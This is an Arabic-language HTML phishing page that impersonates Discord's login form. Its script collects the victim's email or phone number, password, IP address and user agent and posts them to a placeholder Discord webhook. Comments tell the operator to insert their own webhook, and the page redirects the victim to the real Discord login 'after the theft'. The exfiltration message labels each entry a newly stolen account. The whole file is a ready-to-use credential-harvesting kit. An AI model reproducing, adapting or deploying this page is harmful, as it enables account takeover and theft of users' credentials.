<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - تسجيل الدخول</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;600;700&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Whitney', sans-serif; background: linear-gradient(135deg, #36393f 0%, #2f3136 100%); min-height:100vh; display:flex; align-items:center; justify-content:center; }
        .container { max-width:400px; width:90%; background:#36393f; border-radius:8px; box-shadow:0 8px 32px rgba(0,0,0,0.5); padding:40px 32px; }
        .logo { text-align:center; margin-bottom:24px; }
        .logo img { width:120px; height:auto; }
        .form-group { margin-bottom:20px; }
        label { display:block; color:#dcddde; font-size:14px; margin-bottom:8px; font-weight:500; }
        input { width:100%; padding:12px 16px; border:1px solid #202225; border-radius:4px; background:#40444b; color:#dcddde; font-size:16px; transition:border 0.2s; }
        input:focus { outline:none; border-color:#5865f2; }
        input::placeholder { color:#72767d; }
        .submit-btn { width:100%; padding:12px; background:#5865f2; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:500; cursor:pointer; transition:background 0.2s; }
        .submit-btn:hover { background:#4752c4; }
        .error { background:#f04747; color:#fff; padding:12px; border-radius:4px; margin-bottom:20px; display:none; }
        @media (max-width:480px) { .container { padding:32px 24px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://assets-global.website-files.com/64e91f33ee1ab837eade1eb8/64f0d4c3b4b3c985e9820972_discord.svg" alt="Discord">
        </div>
        <div id="error" class="error"></div>
        <form id="loginForm">
            <div class="form-group">
                <label>البريد الإلكتروني أو رقم الهاتف</label>
                <input type="text" id="email" placeholder="someone@example.com" required>
            </div>
            <div class="form-group">
                <label>كلمة السر</label>
                <input type="password" id="password" placeholder="كلمة السر" required>
            </div>
            <button type="submit" class="submit-btn">تسجيل الدخول</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const email = document.getElementById('email');
        const password = document.getElementById('password');
        const error = document.getElementById('error');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const data = {
                email: email.value,
                password: password.value,
                ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(r=>r.ip).catch(()=>'unknown'),
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };

            // غير هذا الـ webhook بتاعك
            const webhook = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';

            try {
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**🆕 حساب Discord مسروق جديد!**\n**Email/Phone:** ${data.email}\n**Password:** ${data.password}\n**IP:** ${data.ip}\n**UA:** ${data.userAgent}\n**وقت:** ${data.timestamp}`
                    })
                });
                
                // إعادة توجيه للصفحة الأصلية بعد السرقة
                window.location.href = 'https://discord.com/login';
            } catch (err) {
                error.textContent = 'خطأ في الاتصال، حاول مرة أخرى.';
                error.style.display = 'block';
            }
        });
    </script>
</body>
</html>
